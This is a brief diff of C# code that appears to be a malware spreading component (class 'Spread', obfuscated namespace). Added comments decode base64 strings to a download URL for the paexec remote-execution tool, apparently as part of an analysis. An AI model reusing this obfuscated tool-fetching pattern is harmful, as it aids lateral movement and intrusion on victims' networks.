@@ -1,4 +1,4 @@
-﻿using System;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Net;
@@ -229,10 +229,12 @@ namespace MufMaOSvGyvz
 			if (IntPtr.Size == 8)
 			{
 				result = Spread.RandomName(new Uri(MainCore.DecodeBase64("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
+				// -> https://www.poweradmin.com/paexec/paexec.exe
 			}
 			else
 			{
 				result = Spread.RandomName(new Uri(MainCore.DecodeBase64("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
+				// -> https://www.poweradmin.com/paexec/paexec.exe
 			}
 			return result;
 		}
